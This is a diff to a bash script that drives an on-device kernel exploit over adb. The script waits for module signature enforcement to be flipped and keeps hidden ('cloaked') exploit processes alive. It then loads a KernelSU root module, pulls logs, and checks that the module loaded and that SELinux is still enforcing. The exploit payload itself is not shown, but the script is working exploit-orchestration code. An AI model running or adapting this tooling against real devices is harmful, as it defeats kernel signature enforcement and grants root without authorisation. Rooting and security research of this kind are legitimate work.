@@ -156,7 +156,7 @@ establish(){
     if adb shell "grep -qa 'sig_enforce FLIPPED' $EXPLOG 2>/dev/null" 2>/dev/null; then
       log "*** sig_enforce FLIPPED in $(( $(date +%s)-s0 ))s after anchor ***"
       adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
-      adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2   # free CPU; cloaked processes (cmd watcher, parked walk waiters) survive — killing a parked waiter panics the kernel
+      adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2   # free CPU; cloaked processes survive by design: the cmd watcher holds the reboot escalation, and walk waiters still inside their carrier syscall must NEVER be woken (kernel panic) — returned ones exit on their own (park window in slide.c)
       return 0
     fi
     sleep 2
@@ -215,7 +215,7 @@ await_load(){
     if adb shell "grep -qi kernelsu /proc/modules 2>/dev/null"; then
       log "*** kernelsu module LIVE in $(( $(date +%s)-t0 ))s ***"; break
     fi
-    if adb shell "grep -qa 'ABORT\|never flipped\|bind-mount FAIL' $RUNDIR/ksu_load.log 2>/dev/null" 2>/dev/null; then
+    if adb shell "grep -qai 'aborting\|bind-mount failed' $RUNDIR/ksu_load.log 2>/dev/null" 2>/dev/null; then
       AWAIT_ABORTED=1
       log "loader script ABORTED — see log"; break
     fi
@@ -245,6 +245,9 @@ await_load(){
     [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/kmsg_cap_stream.txt"
     adb shell "cat $RUNDIR/iomem.txt 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
     [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/iomem.txt"
+    # After a crash-reboot these are unreadable to shell — stream them now.
+    adb shell "cat $RUNDIR/stage_*.log $RUNDIR/kmsg_dumper.err 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
+    [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/stage_and_extras.log"
     for pf in $(adb shell "ls $RUNDIR/prev_kmsg_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r'); do
       adb shell "cat $pf 2>/dev/null" > "$WORK/$(basename $pf)" 2>/dev/null
     done
@@ -339,6 +342,28 @@ for t in $(seq 1 "$MAX_TRIES"); do
     # consumed ON-DEVICE (exploit -> $RUNDIR/ksu_runtime.env).
     await_load
     report
+    # The module must be alive at completion — a mid-watch crash-reboot
+    # or EKEYREJECTED is a failure, not a success.
+    if ! adb shell "grep -qi kernelsu /proc/modules 2>/dev/null"; then
+      log "*** kernelsu NOT in /proc/modules at completion — load did not survive; reboot and retry ***"
+      reboot_device || log "MANUAL REBOOT REQUIRED"
+      exit 1
+    fi
+    # Live sysfs is authoritative (the shell does not survive the flip).
+    # Empty getenforce reads are adb blips — retry; never gate a
+    # deliberate KSU_ENFORCE=0 debug session.
+    if [ "${KSU_ENFORCE:-1}" = "1" ]; then
+      en=""
+      for k in 1 2 3 4 5 6; do
+        en=$(getenforce_dev)
+        [ -n "$en" ] && break
+        sleep 5
+      done
+      if [ "$en" != "Enforcing" ]; then
+        log "*** module loaded but SELinux is NOT enforcing (getenforce='$en') — device left permissive; fix before continuing ***"
+        exit 1
+      fi
+    fi
     if [ "${AWAIT_ABORTED:-0}" = 1 ]; then
       # The exploit's contract: if the loader aborts before the .ko's boot_id
       # restore, ctl.data dangles to freed kernel memory and a reboot is
